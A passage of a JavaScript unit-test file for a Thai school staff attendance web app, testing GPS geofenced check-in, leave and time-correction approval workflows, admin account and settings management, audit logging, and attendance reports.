  const t = addTeacher(sys, 1);
  sys.at('2026-11-09 07:45:00');
  const r = expectErr(sys.api(t.token, 'att.checkIn', OUTSIDE), 'OUT_OF_ZONE');
  assert.ok(r.data.distanceM > 250 && r.data.distanceM < 300 && r.data.inZone === false);
  assert.ok(/นอกพื้นที่โรงเรียน/.test(r.error));
  assert.strictEqual(records(sys, 'AttendanceLogs').length, 0);
  const aud = records(sys, 'AuditLogs').find(l => l.Action === 'CHECKIN_REJECTED');
  assert.ok(aud && !/18\.79/.test(aud.Details));
});

test('T06', 'ค่าความแม่นยำ GPS เกินเกณฑ์ (50 ม.) → ไม่บันทึก', () => {
  const sys = newSystem();
  const t = addTeacher(sys, 1);
  sys.at('2026-11-09 07:45:00');
  const r = expectErr(sys.api(t.token, 'att.checkIn', Object.assign({}, INSIDE, { accuracy: 120 })), 'GPS_ACCURACY');
  assert.ok(/ไม่แม่นยำพอ/.test(r.error));
  ok(sys.api(t.token, 'att.checkIn', Object.assign({}, INSIDE, { accuracy: 50 })));
});

test('T07', 'ข้อมูลพิกัดปลอม/ผิดรูปแบบจาก Browser ถูกปฏิเสธ', () => {
  const sys = newSystem();
  const t = addTeacher(sys, 1);
  sys.at('2026-11-09 07:45:00');
  [{}, { lat: 'abc', lng: 98, accuracy: 5 }, { lat: 91, lng: 98, accuracy: 5 }, { lat: 18, lng: 181, accuracy: 5 },
    { lat: 18.7, lng: 98.9, accuracy: 0 }, { lat: 18.7, lng: 98.9, accuracy: -3 }, { lat: 18.7, lng: 98.9 }, { lat: null, lng: null, accuracy: 5 }]
    .forEach(p => expectErr(sys.api(t.token, 'att.checkIn', p), 'GPS_INVALID'));
});

test('T08', 'คำนวณมาสายตามการตั้งค่า: 08:30:59 ตรงเวลา, 08:31:00 สาย 31 นาที; เปลี่ยนเวลาที่หน้า Admin มีผลทันที', () => {
  const sys = newSystem();
  const a = addTeacher(sys, 1), b = addTeacher(sys, 2), c = addTeacher(sys, 3);
  sys.at('2026-11-09 08:30:59'); assert.strictEqual(ok(sys.api(a.token, 'att.checkIn', INSIDE)).status, 'ON_TIME');
  sys.at('2026-11-09 08:31:00'); const late = ok(sys.api(b.token, 'att.checkIn', INSIDE));
  assert.strictEqual(late.status, 'LATE'); assert.strictEqual(late.lateMinutes, 31);
  ok(sys.api(sys.admin, 'settings.save', { values: { WORK_START_TIME: '07:30', LATE_AFTER_TIME: '07:45' } }));
  sys.at('2026-11-09 08:00:00'); const late2 = ok(sys.api(c.token, 'att.checkIn', INSIDE));
  assert.strictEqual(late2.status, 'LATE'); assert.strictEqual(late2.lateMinutes, 30);
});

test('T09', 'ออกก่อนเวลาเลิกงาน → บันทึกได้แต่สถานะ EARLY', () => {
  const sys = newSystem();
  const t = addTeacher(sys, 1);
  sys.at('2026-11-09 07:50:00'); ok(sys.api(t.token, 'att.checkIn', INSIDE));
  sys.at('2026-11-09 15:00:00');
  assert.strictEqual(ok(sys.api(t.token, 'att.checkOut', INSIDE)).status, 'EARLY');
});

test('T10', 'LockService ไม่ว่าง (ผู้ใช้พร้อมกันมาก) → แจ้งให้ลองใหม่ ไม่บันทึกข้อมูลครึ่ง ๆ กลาง ๆ', () => {
  const sys = newSystem();
  const t = addTeacher(sys, 1);
  sys.at('2026-11-09 07:45:00');
  sys.env.state.lockBusy = true;
  expectErr(sys.api(t.token, 'att.checkIn', INSIDE), 'BUSY');
  sys.env.state.lockBusy = false;
  assert.strictEqual(records(sys, 'AttendanceLogs').length, 0);
  ok(sys.api(t.token, 'att.checkIn', INSIDE));
});

test('T11', 'วันหยุด: ลงเวลาได้ (สถานะวันหยุด) และปิดได้จากการตั้งค่า; ก่อนเวลาเปิดระบบ → ปฏิเสธ', () => {
  const sys = newSystem();
  const t = addTeacher(sys, 1);
  sys.at('2026-11-14 09:00:00'); // เสาร์
  assert.strictEqual(ok(sys.api(t.token, 'att.checkIn', INSIDE)).status, 'HOLIDAY');
  ok(sys.api(sys.admin, 'settings.save', { values: { ALLOW_HOLIDAY_CHECKIN: false } }));
  sys.at('2026-11-15 09:00:00');
  expectErr(sys.api(t.token, 'att.checkIn', INSIDE), 'HOLIDAY');
  sys.at('2026-11-16 04:59:00');
  expectErr(sys.api(t.token, 'att.checkIn', INSIDE), 'TOO_EARLY');
});

test('T12', 'สูตร Haversine แม่นยำ (เทียบระยะทางอ้างอิง)', () => {
  const sys = newSystem({ noAdmin: true });
  const h = sys.env.context.haversineM_;
  assert.ok(Math.abs(h(0, 0, 1, 0) - 111195) < 5);                       // 1 องศาละติจูด
  assert.ok(Math.abs(h(18.7883, 98.9853, 13.7563, 100.5018) - 580e3) < 5e3); // เชียงใหม่ → กรุงเทพฯ ~580 กม.
  assert.strictEqual(Math.round(h(18.7883, 98.9853, 18.7883, 98.9853)), 0);
});

test('T13', 'ตรวจสอบตำแหน่ง (preview) ไม่บันทึกข้อมูลใด ๆ', () => {
  const sys = newSystem();
  const t = addTeacher(sys, 1);
  const p = ok(sys.api(t.token, 'att.preview', INSIDE));
  assert.ok(p.inZone && p.accuracyOk && p.ok);
  const q = ok(sys.api(t.token, 'att.preview', OUTSIDE));
  assert.strictEqual(q.inZone, false);
  assert.strictEqual(records(sys, 'AttendanceLogs').length, 0);
});

test('T14', 'Dashboard บุคลากร: ข้อมูลวันนี้ สถิติเดือน ประวัติล่าสุด เวลา Server', () => {
  const sys = newSystem();
  const t = addTeacher(sys, 1);
  sys.at('2026-11-09 08:40:00'); ok(sys.api(t.token, 'att.checkIn', INSIDE));
  sys.at('2026-11-10 07:50:00'); ok(sys.api(t.token, 'att.checkIn', INSIDE));
  sys.at('2026-11-10 10:00:00');
  const d = ok(sys.api(t.token, 'me.dashboard', {}));
  assert.strictEqual(d.today.date, '2026-11-10');
  assert.strictEqual(d.today.row.checkIn, '07:50:00');
  assert.strictEqual(d.today.dateLabel, 'วันอังคารที่ 10 พฤศจิกายน พ.ศ. 2569');
  assert.strictEqual(d.month.totals.present, 2); assert.strictEqual(d.month.totals.late, 1);
  assert.strictEqual(d.month.totals.missingOut, 1); // 9 พ.ย. ไม่ลงเวลาออก
  assert.strictEqual(d.serverNow, sys.env.clock.now());
  const h = ok(sys.api(t.token, 'me.history', { year: 2026, month: 11 }));
  assert.strictEqual(h.days[0].date, '2026-11-10');
});

/* ================================================================== LEAVE */
test('V01', 'ยื่นใบลา: ตรวจสอบข้อมูล (วันที่, ครึ่งวัน, เหตุผล, วันหยุดล้วน, ไฟล์ปลอม)', () => {
  const sys = newSystem();
  const t = addTeacher(sys, 1);
  const base = { type: 'PERSONAL', startDate: '2026-11-11', endDate: '2026-11-11', reason: 'ธุระส่วนตัว' };
  expectErr(sys.api(t.token, 'leave.submit', Object.assign({}, base, { type: 'XXX' })), 'VALIDATION');
  expectErr(sys.api(t.token, 'leave.submit', Object.assign({}, base, { endDate: '2026-11-10' })), 'VALIDATION');
  expectErr(sys.api(t.token, 'leave.submit', Object.assign({}, base, { endDate: '2026-11-12', period: 'MORNING' })), 'VALIDATION');
  expectErr(sys.api(t.token, 'leave.submit', Object.assign({}, base, { reason: 'x' })), 'VALIDATION');
  expectErr(sys.api(t.token, 'leave.submit', Object.assign({}, base, { startDate: '2026-11-14', endDate: '2026-11-15' })), 'VALIDATION');
  const fake = { name: 'a.pdf', mimeType: 'application/pdf', data: Buffer.from('MZ-not-a-pdf').toString('base64') };
  expectErr(sys.api(t.token, 'leave.submit', Object.assign({}, base, { attachment: fake })), 'VALIDATION');
  const exe = { name: 'a.exe', mimeType: 'application/x-msdownload', data: 'TVo=' };
  expectErr(sys.api(t.token, 'leave.submit', Object.assign({}, base, { attachment: exe })), 'VALIDATION');
  assert.strictEqual(records(sys, 'LeaveRequests').length, 0);
});

test('V02', 'ยื่นใบลาสำเร็จ: นับเฉพาะวันทำการ, ลาซ้อนช่วงเดิมไม่ได้, ยกเลิกเองได้เมื่อรออนุมัติ', () => {
  const sys = newSystem();
  const t = addTeacher(sys, 1);
  const lv = ok(sys.api(t.token, 'leave.submit', { type: 'VACATION', startDate: '2026-11-12', endDate: '2026-11-17', reason: 'พักผ่อนประจำปี' })).leave;
  assert.strictEqual(lv.days, 4); // พฤ ศ จ อ (เว้น ส-อา)
  expectErr(sys.api(t.token, 'leave.submit', { type: 'SICK', startDate: '2026-11-16', endDate: '2026-11-16', reason: 'ป่วย' }), 'DUPLICATE');
  const half = ok(sys.api(t.token, 'leave.submit', { type: 'PERSONAL', startDate: '2026-11-18', endDate: '2026-11-18', period: 'MORNING', reason: 'ไปธนาคาร' })).leave;
  assert.strictEqual(half.days, 0.5);
  ok(sys.api(t.token, 'leave.cancel', { leaveId: lv.leaveId }));
  expectErr(sys.api(t.token, 'leave.cancel', { leaveId: lv.leaveId }), 'VALIDATION');
});

test('V03', 'อนุมัติใบลา: อนุมัติของตนเองไม่ได้, ผู้บริหารอนุมัติได้, แสดงในรายงานเป็น "ลา", ยกเลิกการอนุมัติได้', () => {
  const sys = newSystem();
  const t = addTeacher(sys, 1);
  const ex = addTeacher(sys, 2, 'EXECUTIVE');
  const own = ok(sys.api(ex.token, 'leave.submit', { type: 'OFFICIAL', startDate: '2026-11-09', endDate: '2026-11-09', reason: 'ประชุมเขตพื้นที่' })).leave;
  expectErr(sys.api(ex.token, 'leave.review', { leaveId: own.leaveId, decision: 'APPROVE' }), 'FORBIDDEN');
  ok(sys.api(sys.admin, 'leave.review', { leaveId: own.leaveId, decision: 'APPROVE' }));
  const lv = ok(sys.api(t.token, 'leave.submit', { type: 'SICK', startDate: '2026-11-09', endDate: '2026-11-09', reason: 'มีไข้' })).leave;
  expectErr(sys.api(ex.token, 'leave.review', { leaveId: lv.leaveId, decision: 'REJECT' }), 'VALIDATION'); // ต้องมีเหตุผล
  ok(sys.api(ex.token, 'leave.review', { leaveId: lv.leaveId, decision: 'APPROVE', note: 'อนุญาต' }));
  expectErr(sys.api(ex.token, 'leave.review', { leaveId: lv.leaveId, decision: 'APPROVE' }), 'VALIDATION');
  sys.at('2026-11-09 17:00:00');
  const rep = ok(sys.api(sys.admin, 'report.daily', { date: '2026-11-09' }));
  const row = rep.tables[0].rows.find(r => r.employeeId === t.id);
  assert.strictEqual(row.statusCode, 'LEAVE'); assert.ok(/ลาป่วย/.test(row.note));
  ok(sys.api(sys.admin, 'leave.review', { leaveId: lv.leaveId, decision: 'REVOKE', note: 'บันทึกผิดวัน' }));
  const rep2 = ok(sys.api(sys.admin, 'report.daily', { date: '2026-11-09' }));
  assert.strictEqual(rep2.tables[0].rows.find(r => r.employeeId === t.id).statusCode, 'ABSENT');
  assert.ok(records(sys, 'AuditLogs').some(l => l.Action === 'LEAVE_REVOKE'));
});

test('V04', 'ลาครึ่งวันเช้า: มาสายไม่นับสาย', () => {
  const sys = newSystem();
  const t = addTeacher(sys, 1);
  const lv = ok(sys.api(t.token, 'leave.submit', { type: 'PERSONAL', startDate: '2026-11-09', endDate: '2026-11-09', period: 'MORNING', reason: 'ไปราชการส่วนตัว' })).leave;
  ok(sys.api(sys.admin, 'leave.review', { leaveId: lv.leaveId, decision: 'APPROVE' }));
  sys.at('2026-11-09 12:30:00'); ok(sys.api(t.token, 'att.checkIn', INSIDE));
  const d = ok(sys.api(t.token, 'me.dashboard', {}));
  assert.strictEqual(d.today.row.status, 'PRESENT'); assert.strictEqual(d.month.totals.late, 0); assert.strictEqual(d.month.totals.leaveDays, 0.5);
});

/* ================================================================== CORRECTION */
test('K01', 'คำร้องแก้ไขเวลา: ตรวจสอบวันที่อนาคต/ย้อนหลังเกินกำหนด/เวลาผิด/ซ้ำ', () => {
  const sys = newSystem({ now: '2026-11-12 07:00:00' });
  const t = addTeacher(sys, 1);
  sys.at('2026-11-20 10:00:00');
  const base = { date: '2026-11-19', type: 'IN', time: '07:45', reason: 'โทรศัพท์แบตหมด' };
  expectErr(sys.api(t.token, 'corr.submit', Object.assign({}, base, { date: '2026-11-21' })), 'VALIDATION');
  expectErr(sys.api(t.token, 'corr.submit', Object.assign({}, base, { date: '2026-11-11' })), 'VALIDATION'); // ก่อนวันอนุมัติบัญชี
  ok(sys.api(sys.admin, 'settings.save', { values: { CORRECTION_MAX_DAYS: '3' } }));
  expectErr(sys.api(t.token, 'corr.submit', Object.assign({}, base, { date: '2026-11-16' })), 'VALIDATION'); // ย้อนหลังเกิน 3 วัน
  expectErr(sys.api(t.token, 'corr.submit', Object.assign({}, base, { time: '25:00' })), 'VALIDATION');
  expectErr(sys.api(t.token, 'corr.submit', Object.assign({}, base, { type: 'MID' })), 'VALIDATION');
  expectErr(sys.api(t.token, 'corr.submit', Object.assign({}, base, { date: '2026-11-20', time: '11:00' })), 'VALIDATION');
  expectErr(sys.api(t.token, 'corr.submit', Object.assign({}, base, { reason: 'ลืม' })), 'VALIDATION');
  ok(sys.api(t.token, 'corr.submit', base));
  expectErr(sys.api(t.token, 'corr.submit', base), 'DUPLICATE');
});

test('K02', 'อนุมัติคำร้อง (ไม่มีรายการเดิม): สร้างรายการ CORRECTION + ปรับสรุปรายวัน + คำนวณสาย', () => {
  const sys = newSystem();
  const t = addTeacher(sys, 1);
  sys.at('2026-11-10 09:00:00');
  const rq = ok(sys.api(t.token, 'corr.submit', { date: '2026-11-09', type: 'IN', time: '08:45', reason: 'ลืมกดลงเวลา มีพยาน' })).request;
  expectErr(sys.api(t.token, 'corr.review', { requestId: rq.requestId, decision: 'APPROVE' }), 'FORBIDDEN');
  ok(sys.api(sys.admin, 'corr.review', { requestId: rq.requestId, decision: 'APPROVE', note: 'ตรวจสอบแล้ว' }));
  const log = records(sys, 'AttendanceLogs')[0];
  assert.strictEqual(log.Source, 'CORRECTION'); assert.strictEqual(log.RefID, rq.requestId); assert.strictEqual(log.Status, 'LATE');
  const sum = records(sys, 'DailySummary')[0];
  assert.strictEqual(sum.CheckInTime, '08:45:00'); assert.strictEqual(sum.Corrected, true); assert.strictEqual(sum.LateMinutes, 45);
});

test('K03', 'อนุมัติคำร้องแทนที่รายการเดิม: รายการเดิมไม่ถูกลบ (IsActive=FALSE + SupersededBy) และ Audit Log เก็บข้อมูลก่อน/หลัง', () => {
  const sys = newSystem();
  const t = addTeacher(sys, 1);
  sys.at('2026-11-09 07:50:00'); const orig = ok(sys.api(t.token, 'att.checkIn', INSIDE));
  sys.at('2026-11-09 12:00:00'); ok(sys.api(t.token, 'att.checkOut', INSIDE));
  sys.at('2026-11-09 18:00:00');
  const rq = ok(sys.api(t.token, 'corr.submit', { date: '2026-11-09', type: 'OUT', time: '16:35', reason: 'กดออกงานผิดเวลา ออกจริง 16:35' })).request;
  const list = ok(sys.api(sys.admin, 'corr.adminList', {}));
  assert.strictEqual(list[0].currentOut, '12:00');
  ok(sys.api(sys.admin, 'corr.review', { requestId: rq.requestId, decision: 'APPROVE' }));
  const logs = records(sys, 'AttendanceLogs');
  assert.strictEqual(logs.length, 3);
  const oldOut = logs.find(l => l.Type === 'OUT' && l.Source === 'GPS');
  const newOut = logs.find(l => l.Type === 'OUT' && l.Source === 'CORRECTION');
  assert.strictEqual(oldOut.IsActive, false); assert.strictEqual(oldOut.SupersededBy, newOut.AttendanceID);
  assert.strictEqual(logs.find(l => l.AttendanceID === orig.attendanceId).IsActive, true);
  const sum = records(sys, 'DailySummary')[0];
  assert.strictEqual(sum.CheckOutTime, '16:35:00'); assert.strictEqual(sum.EarlyLeave, false);
  const aud = records(sys, 'AuditLogs').find(l => l.Action === 'CORRECTION_APPROVE');
  const det = JSON.parse(aud.Details);
  assert.strictEqual(det.oldRecord.time, '12:00:00'); assert.strictEqual(det.newRecord.time, '16:35:00');
  const cr = records(sys, 'CorrectionRequests')[0];
  assert.strictEqual(cr.OldAttendanceID, oldOut.AttendanceID); assert.strictEqual(cr.NewAttendanceID, newOut.AttendanceID);
});

test('K04', 'คำร้องเวลาออกก่อนเวลาเข้า → อนุมัติไม่ได้; ไม่อนุมัติต้องระบุเหตุผล', () => {
  const sys = newSystem();
  const t = addTeacher(sys, 1);
  sys.at('2026-11-09 08:00:00'); ok(sys.api(t.token, 'att.checkIn', INSIDE));
  sys.at('2026-11-09 20:00:00');
  const rq = ok(sys.api(t.token, 'corr.submit', { date: '2026-11-09', type: 'OUT', time: '07:30', reason: 'ทดสอบเวลาออกก่อนเข้า' })).request;
  expectErr(sys.api(sys.admin, 'corr.review', { requestId: rq.requestId, decision: 'APPROVE' }), 'VALIDATION');
  expectErr(sys.api(sys.admin, 'corr.review', { requestId: rq.requestId, decision: 'REJECT' }), 'VALIDATION');
  ok(sys.api(sys.admin, 'corr.review', { requestId: rq.requestId, decision: 'REJECT', note: 'เวลาไม่ถูกต้อง' }));
  assert.strictEqual(records(sys, 'CorrectionRequests')[0].Status, 'REJECTED');
});

/* ================================================================== ADMIN */
test('M01', 'Admin เพิ่มสมาชิกเอง: รหัสผ่านชั่วคราวสุ่ม, บังคับเปลี่ยน, ตรวจข้อมูลซ้ำ', () => {
  const sys = newSystem();
  const r = ok(sys.api(sys.admin, 'emp.create', { fullName: 'นายภารโรง ใจดี', staffCode: 'S100', position: 'เจ้าหน้าที่อื่น ๆ', username: 'janitor', role: 'USER' }));
  assert.ok(r.tempPassword.length === 12);
  expectErr(sys.api(sys.admin, 'emp.create', { fullName: 'นายอื่น ทดสอบ', staffCode: 's100', position: 'ครู', username: 'other' }), 'DUPLICATE');
  const d = ok(sys.login('janitor', r.tempPassword));
  assert.strictEqual(d.mustChangePassword, true);
  const r2 = ok(sys.api(sys.admin, 'emp.create', { fullName: 'นายสอง ทดสอบ', staffCode: 'S101', position: 'ครู', username: 'teacher.two' }));
  assert.notStrictEqual(r.tempPassword, r2.tempPassword);
});

test('M02', 'แก้ไขข้อมูล/เปลี่ยนประเภทผู้ใช้/ป้องกันแก้ไขตนเองและต้องเหลือ Admin อย่างน้อย 1 คน', () => {
  const sys = newSystem();
  const t = addTeacher(sys, 1);
  const me = records(sys, 'Employees').find(e => e.Username === 'admin.saohin');
  expectErr(sys.api(sys.admin, 'emp.setStatus', { employeeId: me.EmployeeID, status: 'INACTIVE' }), 'FORBIDDEN');
  expectErr(sys.api(sys.admin, 'emp.setRole', { employeeId: me.EmployeeID, role: 'USER' }), 'FORBIDDEN');
  ok(sys.api(sys.admin, 'emp.update', { employeeId: t.id, fullName: 'นางสาวครู แก้ไขชื่อ', staffCode: 'T001', position: 'บุคลากรทางการศึกษา', username: 'teacher1' }));
  expectErr(sys.api(sys.admin, 'emp.update', { employeeId: t.id, fullName: 'นางสาวครู แก้ไขชื่อ', staffCode: 'ADM001', position: 'ครู', username: 'teacher1' }), 'DUPLICATE');
  ok(sys.api(sys.admin, 'emp.setRole', { employeeId: t.id, role: 'ADMIN' }));
  ok(sys.api(t.token, 'emp.list', {})); // สิทธิ์ใหม่มีผลทันที
  ok(sys.api(t.token, 'emp.setRole', { employeeId: me.EmployeeID, role: 'USER' }));
  expectErr(sys.api(t.token, 'emp.setRole', { employeeId: t.id, role: 'USER' }), 'FORBIDDEN');
  const aud = records(sys, 'AuditLogs').filter(l => l.Action === 'EMPLOYEE_ROLE_CHANGE');
  assert.strictEqual(aud.length, 2);
});

test('M03', 'ลบบัญชี: มีประวัติลงเวลาลบไม่ได้ (ให้ปิดใช้งาน), ไม่มีประวัติลบได้พร้อม Audit', () => {
  const sys = newSystem();
  const t = addTeacher(sys, 1);
  sys.at('2026-11-09 07:50:00'); ok(sys.api(t.token, 'att.checkIn', INSIDE));
  expectErr(sys.api(sys.admin, 'emp.delete', { employeeId: t.id }), 'HAS_HISTORY');
  const id2 = ok(sys.register(regForm(2))).reference;
  ok(sys.api(sys.admin, 'emp.delete', { employeeId: id2 }));
  assert.ok(!records(sys, 'Employees').some(e => e.EmployeeID === id2));
  assert.ok(records(sys, 'AuditLogs').some(l => l.Action === 'EMPLOYEE_DELETE' && l.TargetID === id2));
});

test('M04', 'ตั้งค่า: ตรวจค่าผิด, บันทึก Audit ก่อน/หลัง, มีผลทันที (แคชถูกล้าง)', () => {
  const sys = newSystem();
  expectErr(sys.api(sys.admin, 'settings.save', { values: { SCHOOL_LAT: '95' } }), 'VALIDATION');
  expectErr(sys.api(sys.admin, 'settings.save', { values: { GEOFENCE_RADIUS_M: '5' } }), 'VALIDATION');
  expectErr(sys.api(sys.admin, 'settings.save', { values: { LATE_AFTER_TIME: '07:00' } }), 'VALIDATION');
  expectErr(sys.api(sys.admin, 'settings.save', { values: { WORK_DAYS: '' } }), 'VALIDATION');
  expectErr(sys.api(sys.admin, 'settings.save', { values: { WORK_END_TIME: '8:00pm' } }), 'VALIDATION');
  ok(sys.api(sys.admin, 'settings.save', { values: { GEOFENCE_RADIUS_M: '300', WORK_DAYS: '1,2,3,4,5,6' } }));
  const g = ok(sys.api(sys.admin, 'settings.get', {}));
  assert.strictEqual(g.values.GEOFENCE_RADIUS_M, '300'); assert.strictEqual(g.values.WORK_DAYS, '1,2,3,4,5,6');
  const aud = JSON.parse(records(sys, 'AuditLogs').filter(l => l.Action === 'SETTINGS_UPDATE').pop().Details);
  assert.deepStrictEqual(aud.changes.map(c => [c.key, c.from, c.to]), [['GEOFENCE_RADIUS_M', '150', '300'], ['WORK_DAYS', '1,2,3,4,5', '1,2,3,4,5,6']]);
  const t = addTeacher(sys, 1);
  sys.at('2026-11-09 07:50:00');
  ok(sys.api(t.token, 'att.checkIn', OUTSIDE)); // รัศมีใหม่ 300 ม. ครอบคลุม ~278 ม.
});

test('M05', 'ปฏิทิน: เพิ่มช่วงวันหยุด, วันหยุดราชการคงที่, ลบรายการ และมีผลกับการนับขาดงาน', () => {
  const sys = newSystem();
  const t = addTeacher(sys, 1);
  ok(sys.api(sys.admin, 'cal.add', { startDate: '2026-11-11', endDate: '2026-11-12', type: 'SPECIAL_HOLIDAY', title: 'หยุดกีฬาสี' }));
  const fx = ok(sys.api(sys.admin, 'cal.addFixed', { year: 2027 }));
  assert.ok(/14 วัน/.test(fx.message), fx.message);
  ok(sys.api(sys.admin, 'cal.addFixed', { year: 2027 }));
  const cal = ok(sys.api(sys.admin, 'cal.list', { year: 2027 }));
  assert.strictEqual(cal.entries.length, 14);
  sys.at('2026-11-13 18:00:00');
  const m = ok(sys.api(sys.admin, 'report.monthly', { year: 2026, month: 11 }));
  const row = m.tables[0].rows.find(r => r.employeeId === t.id);
  assert.strictEqual(row.workdays, 3); assert.strictEqual(row.absent, 3); // 9,10,13 (11-12 หยุด)
  ok(sys.api(sys.admin, 'cal.remove', { date: '2026-11-12' }));
  const m2 = ok(sys.api(sys.admin, 'report.monthly', { year: 2026, month: 11 }));
  assert.strictEqual(m2.tables[0].rows.find(r => r.employeeId === t.id).absent, 4);
});

test('M06', 'Admin Overview: จำนวนรวม/มา/สาย/ลา/ขาด/ยังไม่ลงเวลา/ไม่ครบ/รออนุมัติ', () => {
  const sys = newSystem();
  const a = addTeacher(sys, 1), b = addTeacher(sys, 2), c = addTeacher(sys, 3), d = addTeacher(sys, 4);
  ok(sys.register(regForm(5)));
  const lv = ok(sys.api(c.token, 'leave.submit', { type: 'SICK', startDate: '2026-11-09', endDate: '2026-11-09', reason: 'ป่วย' })).leave;
  ok(sys.api(sys.admin, 'leave.review', { leaveId: lv.leaveId, decision: 'APPROVE' }));
  sys.at('2026-11-09 07:55:00'); ok(sys.api(a.token, 'att.checkIn', INSIDE));
  sys.at('2026-11-09 09:10:00'); ok(sys.api(b.token, 'att.checkIn', INSIDE));
  sys.at('2026-11-09 10:00:00');
  let o = ok(sys.api(sys.admin, 'admin.overview', {}));
  assert.strictEqual(o.counts.total, 5); // admin + 4
  assert.strictEqual(o.counts.present, 2); assert.strictEqual(o.counts.late, 1); assert.strictEqual(o.counts.leave, 1);
  assert.strictEqual(o.counts.notYet, 2); assert.strictEqual(o.counts.absent, 0); assert.strictEqual(o.pending.registrations, 1);
  sys.at('2026-11-09 17:00:00');
  o = ok(sys.api(sys.admin, 'admin.overview', {}));
  assert.strictEqual(o.counts.absent, 2); assert.strictEqual(o.counts.incomplete, 2); assert.strictEqual(o.counts.notYet, 0);
  void d;
});

test('M07', 'Audit Log: ดูย้อนหลัง ค้นหา และกรองตามการกระทำ', () => {
  const sys = newSystem();
  addTeacher(sys, 1);
  const all = ok(sys.api(sys.admin, 'audit.list', {}));
  assert.ok(all.length >= 5);
  const reg = ok(sys.api(sys.admin, 'audit.list', { action: 'REGISTRATION_APPROVE' }));
  assert.strictEqual(reg.length, 1);
  assert.ok(ok(sys.api(sys.admin, 'audit.list', { q: 'teacher1' })).length >= 1);
});

/* ================================================================== REPORTS */
function buildMonthScenario(sys) {
  const a = addTeacher(sys, 1), b = addTeacher(sys, 2);
  // จ 9: a ตรงเวลา+ออก, b สาย ไม่ออก
  sys.at('2026-11-09 07:40:00'); ok(sys.api(a.token, 'att.checkIn', INSIDE));
  sys.at('2026-11-09 08:50:00'); ok(sys.api(b.token, 'att.checkIn', INSIDE));
  sys.at('2026-11-09 16:40:00'); ok(sys.api(a.token, 'att.checkOut', INSIDE));
  // อ 10: a ตรงเวลา+ออก, b ลา
  const lv = ok(sys.api(b.token, 'leave.submit', { type: 'PERSONAL', startDate: '2026-11-10', endDate: '2026-11-10', reason: 'ธุระ' })).leave;
  ok(sys.api(sys.admin, 'leave.review', { leaveId: lv.leaveId, decision: 'APPROVE' }));
  sys.at('2026-11-10 07:50:00'); ok(sys.api(a.token, 'att.checkIn', INSIDE));
  sys.at('2026-11-10 16:50:00'); ok(sys.api(a.token, 'att.checkOut', INSIDE));
  // พ 11: a ขาด, b ตรงเวลา+ออก
  sys.at('2026-11-11 08:00:00'); ok(sys.api(b.token, 'att.checkIn', INSIDE));
  sys.at('2026-11-11 16:30:00'); ok(sys.api(b.token, 'att.checkOut', INSIDE));
  sys.at('2026-11-12 10:00:00'); // พฤ 12 ยังไม่ถึงเวลาเลิกงาน
  return { a, b };
}

test('P01', 'รายงานรายวัน: มา/สาย/ลา/ขาด/ไม่ลงเวลาออก/ยังไม่ลงเวลา ถูกต้อง', () => {
  const sys = newSystem();
  const { a, b } = buildMonthScenario(sys);
  const r9 = ok(sys.api(sys.admin, 'report.daily', { date: '2026-11-09' }));
  const s = Object.fromEntries(r9.summary.map(x => [x.label, x.value]));
  assert.strictEqual(s['บุคลากรทั้งหมด'], 3); assert.strictEqual(s['มาปฏิบัติงาน'], 2); assert.strictEqual(s['มาสาย'], 1);
  assert.strictEqual(s['ขาดงาน'], 1); /* admin */ assert.strictEqual(s['ไม่ลงเวลาออก'], 1);
  const rb = r9.tables[0].rows.find(r => r.employeeId === b.id);
  assert.strictEqual(rb.statusCode, 'LATE'); assert.strictEqual(rb.lateMinutes, 50); assert.ok(/ไม่ลงเวลาออก/.test(rb.note));
  const ra = r9.tables[0].rows.find(r => r.employeeId === a.id);
  assert.strictEqual(ra.checkIn, '07:40'); assert.strictEqual(ra.checkOut, '16:40'); assert.ok(ra.inMaps.osm);
  const r12 = ok(sys.api(sys.admin, 'report.daily', { date: '2026-11-12' }));
  assert.strictEqual(Object.fromEntries(r12.summary.map(x => [x.label, x.value]))['ยังไม่ลงเวลา'], 3);
  expectErr(sys.api(sys.admin, 'report.daily', { date: '2026-12-25' }), 'VALIDATION');
});

test('P02', 'รายงานรายเดือน: สถิติรายบุคคล วันมา/สาย/ลา/ขาด/ไม่ครบ/เวลาเฉลี่ย/ร้อยละ', () => {
  const sys = newSystem();
  const { a, b } = buildMonthScenario(sys);
  const m = ok(sys.api(sys.admin, 'report.monthly', { year: 2026, month: 11 }));
  const ra = m.tables[0].rows.find(r => r.employeeId === a.id), rb = m.tables[0].rows.find(r => r.employeeId === b.id);
  if (process.env.DEBUG) console.log(JSON.stringify([ra, rb]));
  assert.deepStrictEqual([ra.workdays, ra.present, ra.late, ra.leaveDays, ra.absent, ra.incomplete, ra.avgIn, ra.avgOut, ra.rate],
    [3, 2, 0, 0, 1, 0, '07:45', '16:45', 66.7]);
  assert.deepStrictEqual([rb.workdays, rb.present, rb.late, rb.leaveDays, rb.absent, rb.incomplete, rb.avgIn, rb.rate],
    [3, 2, 1, 1, 0, 1, '08:25', 100]);
  assert.strictEqual(m.chart.kind, 'stackedBar');
  const i9 = m.chart.series.labels.indexOf('9'), i10 = m.chart.series.labels.indexOf('10');
  assert.deepStrictEqual([m.chart.series.onTime[i9], m.chart.series.late[i9], m.chart.series.absent[i9]], [1, 1, 1]);
  assert.deepStrictEqual([m.chart.series.onTime[i10], m.chart.series.leave[i10], m.chart.series.absent[i10]], [1, 1, 1]);
  assert.ok(!m.chart.series.labels.includes('7') && !m.chart.series.labels.includes('8')); // เสาร์-อาทิตย์ไม่อยู่ในกราฟ
});

test('P03', 'รายงานรายปี: เปรียบเทียบรายเดือน + สถิติรายบุคคลทั้งปี + ข้อมูลกราฟแนวโน้ม', () => {
  const sys = newSystem();
  buildMonthScenario(sys);
  const y = ok(sys.api(sys.admin, 'report.yearly', { year: 2026 }));
  const nov = y.tables[0].rows[10];
  assert.strictEqual(nov.month, 'พฤศจิกายน'); assert.strictEqual(nov.present, 4); assert.strictEqual(nov.late, 1); assert.strictEqual(nov.leave, 1);
  assert.strictEqual(y.tables[0].rows[0].present, 0);
  assert.strictEqual(y.chart.rate.length, 12);
  assert.strictEqual(y.tables[1].rows.length, 3);
});

test('P04', 'รายงานรายบุคคล: ประวัติรายวัน + รายการลา + สรุป', () => {
  const sys = newSystem();
  const { b } = buildMonthScenario(sys);
  const r = ok(sys.api(sys.admin, 'report.individual', { employeeId: b.id, from: '2026-11-01', to: '2026-11-30' }));
  assert.strictEqual(r.person.staffCode, 'T002');
  assert.strictEqual(r.tables[0].rows.length, 4); // 9–12 พ.ย.: เริ่มนับตั้งแต่วันอนุมัติบัญชี และตัดวันอนาคต
  assert.strictEqual(r.tables[1].rows.length, 1);
